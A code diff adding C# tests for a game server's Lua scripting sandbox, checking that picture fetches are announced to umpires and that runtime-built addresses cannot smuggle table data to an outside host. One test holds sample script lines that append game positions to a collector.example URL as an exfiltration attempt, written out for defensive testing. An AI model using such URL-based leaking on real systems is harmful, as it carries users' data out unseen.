@@ -526,6 +526,40 @@ public class ScriptingTests
     }
 
     [Fact]
+    public void The_umpires_are_told_once_which_web_address_scripts_fetch_from()
+    {
+        using var t = new Table();
+        t.Server.Scripts.FetchPicture = _ => Task.FromResult<string?>(null);
+        var logged = t.Server.Log.Count;
+        SetScript(t, "function on_load() for n = 1, 3 do game.fetch_picture('https://pictures.example/units/' .. n .. '.png', function() end) end end");
+        var told = Flat(t.Server.Log.Skip(logged)).OfType<Say>().Where(s => s.Text.Contains("pictures.example")).ToList();
+        Assert.Equal("u:", Assert.Single(told).To);
+        Assert.StartsWith("Scripts here fetch from the web address pictures.example", told[0].Text);
+    }
+
+    [Fact]
+    public void An_address_built_while_running_cannot_carry_the_table_out_in_a_question_mark_but_a_written_or_typed_one_is_fetched()
+    {
+        using var t = new Table();
+        var asked = new List<string>();
+        t.Server.Scripts.FetchPicture = link => { asked.Add(link); return Task.FromResult<string?>(null); };
+        SetScript(t, """
+            function on_load()
+              local where = '12,40'
+              game.fetch_picture('https://collector.example/p.png?at=' .. where, function() end)
+              game.fetch_picture('https://collector.example/p.png#' .. where, function() end)
+              game.fetch_picture('https://cdn.example/arms.png?v=3', function() end)
+            end
+            """);
+        Assert.Equal(["https://cdn.example/arms.png?v=3"], asked);
+        Assert.Contains(t.Server.Scripts.Feed, l => l.Text.StartsWith("not fetched") && l.Text.Contains("collector.example"));
+
+        t.Server.Handle(Table.Host, new UiEvent { Id = "link", Event = "onEndEdit", Value = "https://collector.example/p.png?at=typed" });
+        SetScript(t, "function on_load() game.fetch_picture('https://collector.example/p.png?at=' .. 'typed', function() end) end");
+        Assert.Contains("https://collector.example/p.png?at=typed", asked);
+    }
+
+    [Fact]
     public void A_picture_link_a_module_script_builds_while_it_runs_is_fetched_and_shown_on_the_piece()
     {
         using var t = new Table();
